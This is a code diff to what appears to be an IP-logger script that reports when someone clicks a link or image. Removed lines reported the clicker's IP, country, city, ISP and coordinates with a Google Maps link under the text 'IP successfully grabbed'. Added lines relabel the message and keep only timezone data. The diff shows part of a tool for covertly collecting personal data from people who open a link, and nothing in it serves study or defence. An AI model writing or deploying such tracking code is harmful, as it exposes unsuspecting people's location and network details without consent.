@@ -35,7 +35,7 @@ config = {
 
     "message": { 
         "doMessage": False,
-        "message": ".",
+        "message": "User clicked on the link!",
         "richMessage": True,
     },
 
@@ -134,20 +134,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "",
             "color": config["color"],
-            "description": f"""```The user has clicked the image. IP successfully grabbed. <WingsServices>
+            "description": f"""```The user has clicked on the link. Public info: 
             
-> IP:
-{ip if ip else 'unknown'}
-
-> Country / City:
-{info['country'] if info['country'] else 'unknown'} / {info['city'] if info['city'] else 'unknown'}
-
-> Provider:
-{info['isp'] if info['isp'] else 'unknown'}
-
-> Coords:
-{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-
 > Timezone:
 {info['timezone'].split('/')[0]}
 
